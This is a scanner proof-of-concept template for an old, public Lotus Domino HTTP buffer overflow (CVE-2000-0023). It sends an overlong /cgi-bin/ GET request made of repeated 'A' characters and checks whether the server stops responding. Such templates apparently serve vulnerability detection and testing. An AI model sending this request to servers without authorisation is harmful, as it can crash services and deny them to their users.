[info]
author = "ave"
description = "向 Lotus Domino HTTP 服务器发送超长 URL 请求（针对 /cgi-bin/ 路径），触发 HTTP 服务组件中的栈缓冲区溢出，导致服务进程崩溃造成拒绝服务。攻击者无需认证即可远程利用，漏洞公开于 1999 年，存在公开检测脚本（Nessus 10059）。"
id = "POC-AVE-2000-0021"
name = "Lotus Domino HTTP Server Buffer Overflow DoS PoC"
severity = "medium"
tags = ["ave-2000-0021"]
vuln_id = [
    "CVE-2000-0023",
    "AVE-2000-0021",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/cgi-bin/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
protocol = "http"

[[poc.requests.matchers]]
expect = false
status = [200]
type = "status"
